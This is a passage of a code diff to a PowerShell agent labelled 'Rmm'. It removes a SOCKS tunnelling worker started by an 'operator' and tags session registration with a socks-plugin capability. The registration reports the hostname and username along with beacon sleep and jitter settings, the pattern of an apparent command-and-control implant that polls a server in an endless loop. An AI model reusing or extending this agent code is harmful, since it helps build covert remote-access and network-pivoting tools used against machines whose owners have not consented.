-    $script:RmmSocksWorker.Async = $async
-    Write-Host "[*] SOCKS channel started (operator ran socks; logs below)" -ForegroundColor Cyan
-    Drain-RmmSocksHostLog
-    [RmmHostAnchor]::Restore()
-}
-
-function Stop-RmmSocksChannelWorker {
-    if (-not $script:RmmSocksWorker.Running) { return }
-    $rs = $script:RmmSocksWorker.Runspace
-    $ps = $script:RmmSocksWorker.PowerShell
-    if ($rs) {
-        try { $rs.SessionStateProxy.SetVariable('RmmSocksChannelStop', $true) } catch { }
-    }
-    if ($ps -and $script:RmmSocksWorker.Async) {
-        try { $ps.EndInvoke($script:RmmSocksWorker.Async) } catch { }
-    }
-    if ($ps) { $ps.Dispose() }
-    if ($rs) { $rs.Close() }
-    $script:RmmSocksWorker.Running = $false
-    $script:RmmSocksWorker.Runspace = $null
-    $script:RmmSocksWorker.PowerShell = $null
-    $script:RmmSocksWorker.Async = $null
-    Drain-RmmSocksHostLog
-    Write-Host "[*] SOCKS channel stopped" -ForegroundColor Yellow
-    [RmmHostAnchor]::Restore()
-}
 
 # 2>&1 on native exes turns stderr into ErrorRecord; Out-String then dumps script position noise.
 function ConvertTo-RmmPlainText {
@@ -2535,7 +1852,7 @@ function Register-RmmSession {
         [switch]$Quiet,
         [switch]$Reconnect
     )
-    $registerQs = "id=$([uri]::EscapeDataString($sessionId))&h=$([uri]::EscapeDataString($computerName))&u=$([uri]::EscapeDataString($userName))"
+    $registerQs = "id=$([uri]::EscapeDataString($sessionId))&h=$([uri]::EscapeDataString($computerName))&u=$([uri]::EscapeDataString($userName))&caps=socks-plugin"
     if (-not $script:RmmRegisterConfigSynced -or $Reconnect) {
         $registerQs += "&s=$($script:baseSleepSeconds)&j=$($script:jitterPercent)&sync=1"
     }
@@ -2948,4 +2265,3 @@ while ($true) {
         }
     }
 } 
-
